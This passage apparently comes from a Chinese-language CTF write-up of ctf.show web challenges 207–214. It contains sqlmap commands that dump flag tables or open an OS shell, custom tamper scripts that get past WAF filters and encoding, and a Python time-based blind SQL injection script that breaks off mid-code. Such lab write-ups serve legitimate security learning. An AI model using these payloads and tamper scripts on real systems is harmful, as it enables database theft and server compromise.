<pre tabindex="0"><code>sqlmap -u &#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=btkhe9vojj5a7piadlc51ubifk;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxca --dump
</code></pre><h4 id="web208">web208<a hidden class="anchor" aria-hidden="true" href="#web208">#</a></h4>
<p>同上一题</p>
<pre tabindex="0"><code>sqlmap -u &#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=3e08elobpci83dm5l8mn4hd18k;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=space2comment -T ctfshow_flaxcac --dump
</code></pre><h4 id="web209">web209<a hidden class="anchor" aria-hidden="true" href="#web209">#</a></h4>
<p>这题新增了点waf</p>
<pre tabindex="0"><code>查询语句

//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 0,1;&#34;;
      
返回逻辑

//对传入的参数进行了过滤
  function waf($str){
   //TODO 未完工
   return preg_match(&#39;/ |\*|\=/&#39;, $str);
  }
</code></pre><p>Y4tacker大佬的tamper</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s2">Author:Y4tacker
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.compat</span> <span class="kn">import</span> <span class="n">xrange</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">LOW</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">def</span> <span class="nf">space2comment</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">retVal</span> <span class="o">=</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">retVal</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">quote</span><span class="p">,</span> <span class="n">doublequote</span><span class="p">,</span> <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">firstspace</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">                <span class="k">if</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">                    <span class="n">firstspace</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">                    <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">                    <span class="k">continue</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">                <span class="n">quote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">quote</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">                <span class="n">doublequote</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">doublequote</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">
</span></span><span class="line"><span class="ln">36</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;*&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">
</span></span><span class="line"><span class="ln">40</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;=&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;like&#39;</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">
</span></span><span class="line"><span class="ln">44</span><span class="cl">            <span class="k">elif</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34; &#34;</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">doublequote</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">                <span class="n">retVal</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x0a</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">
</span></span><span class="line"><span class="ln">48</span><span class="cl">            <span class="n">retVal</span> <span class="o">+=</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">
</span></span><span class="line"><span class="ln">50</span><span class="cl">    <span class="k">return</span> <span class="n">retVal</span>
</span></span></code></pre></div><p>其实也不用写这么复杂</p>
<p>直接这样也ok的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">return</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">,</span> <span class="s2">&#34; like &#34;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x09</span><span class="p">))</span>
</span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=3oemcboib377tes0fi7ltgh9ba;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web209 -T ctfshow_flav --dump
</code></pre><h4 id="web210">web210<a hidden class="anchor" aria-hidden="true" href="#web210">#</a></h4>
<pre tabindex="0"><code>查询语句

//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 0,1;&#34;;
      
返回逻辑

//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
      
</code></pre><p>这题会对查询的字符进行两次的base64解密和两次的反转</p>
<p>那我们只需要修改tamper，使传入的payload进行两次base64加密即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">rev1</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">encode1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="n">rev2</span> <span class="o">=</span> <span class="n">encode1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">encode2</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev2</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">return</span> <span class="n">encode2</span>
</span></span></code></pre></div><p>payload:</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=bffum6tr2u1k3h8l9bgtkst4ni;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web210 -T ctfshow_flavi --dump
</code></pre><h4 id="web211">web211<a hidden class="anchor" aria-hidden="true" href="#web211">#</a></h4>
<pre tabindex="0"><code>查询语句

//拼接sql语句查找指定ID用户
$sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 0,1;&#34;;
      
返回逻辑

//对查询字符进行解密
  function decode($id){
    return strrev(base64_decode(strrev(base64_decode($id))));
  }
function waf($str){
    return preg_match(&#39;/ /&#39;, $str);
}
</code></pre><p>增加了空格waf</p>
<p>问题不大</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="ch">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">__priority__</span> <span class="o">=</span> <span class="n">PRIORITY</span><span class="o">.</span><span class="n">NORMAL</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">def</span> <span class="nf">dependencies</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">	
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="n">payload0</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x09</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="n">rev1</span> <span class="o">=</span> <span class="n">payload0</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">encode1</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="n">rev2</span> <span class="o">=</span> <span class="n">encode1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="n">encode2</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">rev2</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">return</span> <span class="n">encode2</span>
</span></span></code></pre></div><p>payload</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=ibn3o3imhq85l1043f80nbdova;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavia --dump
</code></pre><h4 id="web212">web212<a hidden class="anchor" aria-hidden="true" href="#web212">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="o">//</span><span class="n">拼接sql语句查找指定ID用户</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="err">$</span><span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="err">$</span><span class="nb">id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 0,1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="o">//</span><span class="n">对查询字符进行解密</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="n">function</span> <span class="n">decode</span><span class="p">(</span><span class="err">$</span><span class="nb">id</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="n">strrev</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="n">strrev</span><span class="p">(</span><span class="n">base64_decode</span><span class="p">(</span><span class="err">$</span><span class="nb">id</span><span class="p">))));</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">function</span> <span class="n">waf</span><span class="p">(</span><span class="err">$</span><span class="nb">str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="n">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*/&#39;</span><span class="p">,</span> <span class="err">$</span><span class="nb">str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>waf增加了*</p>
<p>但是不影响上一题的tamper</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=72duisds4cprdqlbtf4fu4389d;&#34; --referer=ctf.show -D ctfshow_web --safe-url=&#34;http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web211 -T ctfshow_flavis --dump
</code></pre><h4 id="web213">web213<a hidden class="anchor" aria-hidden="true" href="#web213">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">查询语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1">//拼接sql语句查找指定ID用户
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 0,1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1">//对查询字符进行解密
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">function</span> <span class="nf">decode</span><span class="p">(</span><span class="nv">$id</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">return</span> <span class="nx">strrev</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$id</span><span class="p">))));</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">return</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*/&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>根据提示，用&ndash;os-shell拿到shell读flag</p>
<p>其他跟上题一样</p>
<p>payload:</p>
<pre tabindex="0"><code>python sqlmap.py -u &#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/index.php&#34; --method=put --data=&#34;id=1&#34; --headers=&#34;Content-Type: text/plain&#34; --cookie=&#34;PHPSESSID=66ddslui3ejn3b4pa6437qm60j;&#34; --referer=ctf.show --safe-url=&#34;http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/getToken.php&#34; --safe-freq=1 --tamper=web211 --os-shell
</code></pre><p><img alt="image-20250213223852147" loading="lazy" src="./assets/image-20250213223852147.png"></p>
<h4 id="时间盲注">时间盲注<a hidden class="anchor" aria-hidden="true" href="#时间盲注">#</a></h4>
<h4 id="web214">web214<a hidden class="anchor" aria-hidden="true" href="#web214">#</a></h4>
<p><img alt="image-20250214112011874" loading="lazy" src="./assets/image-20250214112011874.png"></p>
<p>这道题没给出注入点</p>
<p><img alt="image-20250214114945157" loading="lazy" src="./assets/image-20250214114945157.png"></p>
<p>主页找到select.js中，测试后发现ip为注入点</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://fe78d582-57da-4291-845f-1e8ff2936104.challenge.ctf.show/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="c1"># ASCII码范围，32到127是可打印字符的范围</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># 二分查找的中间值</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="c1"># 查表名</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># 查列名</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagx&#39;&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># 爆字段</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select flaga from ctfshow_flagx&#34;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;ip&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;if(ascii(substr((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,sleep(1),1)&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="s1">&#39;debug&#39;</span><span class="p">:</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="c1"># 发送POST请求，设置超时时间为1秒</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">            <span class="c1"># 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="c1"># 如果请求超时，说明当前位置字符的ASCII码大于中间值</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">            <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
